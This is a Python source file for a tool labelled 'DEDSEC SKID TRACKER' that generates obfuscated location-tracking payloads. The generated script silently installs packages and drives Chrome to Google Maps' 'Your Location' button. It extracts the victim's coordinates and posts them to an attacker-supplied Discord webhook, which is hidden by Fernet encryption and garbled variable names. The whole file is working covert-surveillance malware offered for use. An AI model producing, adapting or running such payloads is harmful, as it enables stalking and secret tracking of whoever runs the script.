#coded by 0xbit
from cryptography.fernet import Fernet
from tabulate import tabulate
import os, time, sys, re
from pystyle import *

dark = Col.dark_gray
purple = Colors.StaticMIX((Col.green, Col.blue))

banner = '''
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣄⣠⣀⡀⣀⣠⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⢠⣠⣼⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⢠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣟⣾⣿⣽⣿⣿⣅⠈⠉⠻⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⢀⡶⠒⢉⡀⢠⣤⣶⣶⣿⣷⣆⣀⡀⠀⢲⣖⠒⠀⠀⠀⠀⠀⠀⠀
        ⢀⣤⣾⣶⣦⣤⣤⣶⣿⣿⣿⣿⣿⣿⣽⡿⠻⣷⣀⠀⢻⣿⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⣤⣶⣶⣤⣀⣀⣬⣷⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣦⣼⣀⠀
        ⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠓⣿⣿⠟⠁⠘⣿⡟⠁⠀⠘⠛⠁⠀⠀⢠⣾⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⠙⠁
        ⠀⠸⠟⠋⠀⠈⠙⣿⣿⣿⣿⣿⣿⣷⣦⡄⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣼⣆⢘⣿⣯⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠉⢱⡿⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡿⠦⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡗⠀⠈⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣉⣿⡿⢿⢷⣾⣾⣿⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⠿⠿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣾⣿⣿⣷⣦⣶⣦⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣤⡖⠛⠶⠤⡀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠙⣿⣿⠿⢻⣿⣿⡿⠋⢩⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠧⣤⣦⣤⣄⡀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠘⣧⠀⠈⣹⡻⠇⢀⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠈⢽⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣴⣿⣷⢲⣦⣤⡀⢀⡀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣷⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠂⠛⣆⣤⡜⣟⠋⠙⠂⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⠉⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣆⠀⠰⠄⠀⠉⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⠿⠿⣿⣿⣿⠇⠀⠀⢀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⡇⠀⠀⢀⣼⠿⠇⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

'''

banner1 = '''
                           [ DEDSEC SKID TRACKER ]

            [1]. GENERATE PAYLOAD
            [2]. IMPORT WEBHOOK
            [0]. EXIT
'''

def encrypt(text, key):
    cipher_suite = Fernet(key)
    encrypted_api = cipher_suite.encrypt(text.encode())
    return encrypted_api

def sc(bb):
    return bb.swapcase()

def create_payload():
    try:
        with open('.w.txt', 'r'):
            pass
    except FileNotFoundError:
        with open('.w.txt', 'w') as file:
            pass

    payload_name = input('\n\tPAYLOAD NAME: ')

    with open('.w.txt', 'r') as f:
        api_key = f.readline().strip()
        if not api_key:
            print()
            print(tabulate([['ADD WEBHOOK LINK FIRST']], tablefmt='fancy_grid'))
            time.sleep(3)
            return menu()
        else:
            pass
        f.close()

    key = Fernet.generate_key()
    encrypted_api = encrypt(api_key, key)
    encrypted_api_str = encrypted_api.decode()
    key_str = key.decode()
    char2 = 'A'
    repl2 = '.'
    var1 = encrypted_api_str.replace(char2, repl2)
    var2 = key_str.replace(char2, repl2)
    n_v_1 = sc(var1)
    n_v_2 = sc(var2)

    with open(f'{payload_name}.py', 'w') as write_p:
            write_p.write(f"""
import subprocess

def mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8kVgYBXyjduf6(package_name):
    print('loading..')
    try:
        subprocess.check_output(["pip", "show", package_name], stderr=subprocess.DEVNULL, universal_newlines=True)
    except subprocess.CalledProcessError:
        subprocess.call(["pip", "install", package_name], stderr=subprocess.DEVNULL, stdout=subprocess.PIPE)

mbV0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8kVgYBXyjduf6 = ["selenium ", "discord-webhook"]

for package in mbV0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8kVgYBXyjduf6:
    mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8kVgYBXyjduf6(package)

import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from discord_webhook import DiscordWebhook
from cryptography.fernet import Fernet

def mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6(end, ends):
    mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyJduf6mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6 = Fernet(ends)
    mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyJduf6mbV_Ofb9oA6LxRud3fr9huB8k_VgYBXyjduf6 = mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyJduf6mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6.decrypt(end).decode()
    return mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyJduf6mbV_Ofb9oA6LxRud3fr9huB8k_VgYBXyjduf6


banner = '''

        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣄⣠⣀⡀⣀⣠⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⢠⣠⣼⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⢠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣟⣾⣿⣽⣿⣿⣅⠈⠉⠻⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⢀⡶⠒⢉⡀⢠⣤⣶⣶⣿⣷⣆⣀⡀⠀⢲⣖⠒⠀⠀⠀⠀⠀⠀⠀
        ⢀⣤⣾⣶⣦⣤⣤⣶⣿⣿⣿⣿⣿⣿⣽⡿⠻⣷⣀⠀⢻⣿⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⣤⣶⣶⣤⣀⣀⣬⣷⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣦⣼⣀⠀
        ⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠓⣿⣿⠟⠁⠘⣿⡟⠁⠀⠘⠛⠁⠀⠀⢠⣾⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⠙⠁
        ⠀⠸⠟⠋⠀⠈⠙⣿⣿⣿⣿⣿⣿⣷⣦⡄⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣼⣆⢘⣿⣯⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠉⢱⡿⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡿⠦⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡗⠀⠈⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣉⣿⡿⢿⢷⣾⣾⣿⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⠿⠿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣾⣿⣿⣷⣦⣶⣦⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣤⡖⠛⠶⠤⡀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠙⣿⣿⠿⢻⣿⣿⡿⠋⢩⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠧⣤⣦⣤⣄⡀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠘⣧⠀⠈⣹⡻⠇⢀⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠈⢽⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣴⣿⣷⢲⣦⣤⡀⢀⡀⠀⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣷⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠂⠛⣆⣤⡜⣟⠋⠙⠂⠀⠀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⠉⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣆⠀⠰⠄⠀⠉⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⠿⠿⣿⣿⣿⠇⠀⠀⢀⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⡇⠀⠀⢀⣼⠿⠇⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

'''

def ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40(ue3nFtttirNu4EuJ8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40):
    return ue3nFtttirNu4EuJ8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40.swapcase()

def i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirN():
    try:
        i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8 = webdriver.Chrome()
        i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8.get("https://www.google.com/maps")
        time.sleep(5)
        i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJG140hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8 = i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8.find_element(By.XPATH, "//button[@aria-label='Your Location']")
        i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJG140hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8.click()
        time.sleep(2)
        i40hiSB9b8dsVZ8HZG140hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJG140hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8 = i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8.current_url
        i40hiSB9b8dsVZ8HZG140hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0h1SB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJG140hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8 = i40hiSB9b8dsVZ8HZG140hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJG140hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8.split('@')[1].split(',')[0]
        i40hiSB9b8dsVZ8HZG140hiSB9b8dsVZ8HZtN8MAG3ue3nFttt1rNu4Euj8y0h1SB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJG140hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8 = i40hiSB9b8dsVZ8HZG140hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJG140hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8.split('@')[1].split(',')[1]

        i40h1SB9b8dsVZ8HZG140h1SB9b8dsVZ8HZtN8MAG3ue3nFttt1rNu4Euj8y0h1SB9b8dsVZ8MAG3ue3nFttt1rNu4Euj8yTJLjYJcJG140h1SB9b8dsVZ8HZGi40hiSB9b8dsVZ8 = "https://www.google.com/maps/place/" + i40hiSB9b8dsVZ8HZG140hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0h1SB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJG140hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8 + "," + i40hiSB9b8dsVZ8HZG140hiSB9b8dsVZ8HZtN8MAG3ue3nFttt1rNu4Euj8y0h1SB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJG140hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8
        mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6 = '{n_v_1}'
        mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf7 = '{n_v_2}'
        f5GIAXdNOOK0DEd5FmMBnsbSF83H9hwX1wyQuH1huyq = '.'
        f5GIAXdNOOK0DEd5FnMBnsbSF83H9hwX1wyQuH1huyq = 'A'

        nAOsUFdh8tN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJCg = ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40(mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6)
        nAOsUFdh8tN8MAG3ue3nFttiirNu4Euj8yTJLjYJcJCg = ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40(mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf7)
        B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS = nAOsUFdh8tN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJCg.replace(f5GIAXdNOOK0DEd5FmMBnsbSF83H9hwX1wyQuH1huyq, f5GIAXdNOOK0DEd5FnMBnsbSF83H9hwX1wyQuH1huyq)
        B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40h1SB9b8dsVZ8HZGi40hiS = nAOsUFdh8tN8MAG3ue3nFttiirNu4Euj8yTJLjYJcJCg.replace(f5GIAXdNOOK0DEd5FmMBnsbSF83H9hwX1wyQuH1huyq, f5GIAXdNOOK0DEd5FnMBnsbSF83H9hwX1wyQuH1huyq)
        
        B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS = mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6mbV_0fb9oA6LxRud3fr9huB8k_VgYBXyjduf6(B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS, B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40h1SB9b8dsVZ8HZGi40hiS)

        B9b8dsVZ8VUiNpJWciiXkfF6MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS = B9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS
        webhook = DiscordWebhook(url=B9b8dsVZ8VUiNpJWciiXkfF6MMHNow78zyU4PHZGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZGi40hiS, content=i40h1SB9b8dsVZ8HZG140h1SB9b8dsVZ8HZtN8MAG3ue3nFttt1rNu4Euj8y0h1SB9b8dsVZ8MAG3ue3nFttt1rNu4Euj8yTJLjYJcJG140h1SB9b8dsVZ8HZGi40hiSB9b8dsVZ8)
        webhook.execute()
        print(banner)

    except Exception as e:
        print("RUN AGAIN ")
    finally:
        i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirNu4Euj8yTJLjYJcJGi40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8.quit()

if __name__ == "__main__":
    i40hiSB9b8dsVZ8HZGi40hiSB9b8dsVZ8HZtN8MAG3ue3nFtttirNu4Euj8y0hiSB9b8dsVZ8MAG3ue3nFtttirN()

""")

    print()
    print(tabulate([['PAYLOAD GENERATED:', f'{payload_name}.py']], tablefmt='fancy_grid'))

def setup_webhook():
    file_name = ".w.txt"
    try:
        with open(file_name, 'r') as web_link:
            content = web_link.read()
            if not content.strip(): 
                print()
                print(tabulate([[f'CURRENT WEBHOOK: ','EMPTY']], tablefmt='fancy_grid'))
                weblink = input("\n    Enter a Discord webhook URL: ")
                if validate_webhook(weblink):
                    print("\n    [VALID]")
                    with open(f'.w.txt', 'w') as web:
                        web.write(weblink)
                    time.sleep(2)
                else:
                    print("\n    [INVALID]")
                    time.sleep(2)
                    return setup_webhook()
                menu()
            else:
                print()
                print(tabulate([[f'CURRENT WEBHOOK: ',f'{content}']], tablefmt='fancy_grid'))
                weblink = input("\n    Enter a Discord webhook URL: ")
                if validate_webhook(weblink):
                    print("\n    [VALID]")
                    with open(f'.w.txt', 'w') as web:
                        web.write(weblink)
                    time.sleep(2)
                else:
                    print("\n    [INVALID]")
                    time.sleep(2)
                menu()
    except FileNotFoundError:
        with open(file_name, 'w') as f:
            f.write('')
            f.close()
        return setup_webhook()

def validate_webhook(url):
    pattern = r'^https://discord\.com/api/webhooks/\d+/\w+$'
    if re.match(pattern, url):
        return True
    else:
        return False

def menu():
    os.system('clear')
    print(Colorate.Diagonal(Colors.DynamicMIX((purple, dark)), banner))
    print(((purple)), (banner1))
    select = input('\n\t[?] DEDSEC: ')
    if select == '1':
        create_payload()
    elif select == '2':
        setup_webhook()
    elif select == '0':
        sys.exit('\n\tBYE BYE!')

menu()